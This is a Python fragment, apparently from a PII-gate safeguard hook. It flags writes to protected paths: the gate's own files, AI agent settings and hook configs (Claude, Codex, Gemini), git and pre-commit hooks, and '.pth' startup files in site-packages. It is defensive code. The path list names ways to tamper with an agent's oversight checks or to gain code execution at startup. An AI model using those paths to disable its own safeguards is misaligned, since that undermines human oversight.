    norm = posixpath.normpath(_NTFS_TAIL.sub("", path.replace("\\", "/"), count=1))
    low = norm.lower()
    base = posixpath.basename(low)
    if base == ".pii-gate.json" or "/.pii-gate/" in low or base in _STARTUP_FILES or base == ".claude.json":
        return True
    if base.endswith(".pth") and re.search(r"(?:site|dist)-packages/", low):
        return True
    if re.search(r"\.codex/+(?:hooks\.json|config\.toml)$|\.claude/+settings(?:\.local)?\.json$"
                 r"|managed-settings(?:\.json|\.d/)|\.gemini/+settings\.json$|\.git/+hooks/|/\.pre-commit-config\.ya?ml$",
                 low):
        return True
    rel = low
    if cwd:
        root = posixpath.normpath(cwd.replace("\\", "/")).lower().rstrip("/") + "/"
        if low.startswith(root):
            rel = low[len(root):]
    first = rel.split("/", 1)[0]
    return first in ("pii_gate", "pii_gate.py")


def mask_cmd(token: str) -> str:
    token = token.strip()
    return token[:12] if len(token) <= 12 else token[:12] + "..."
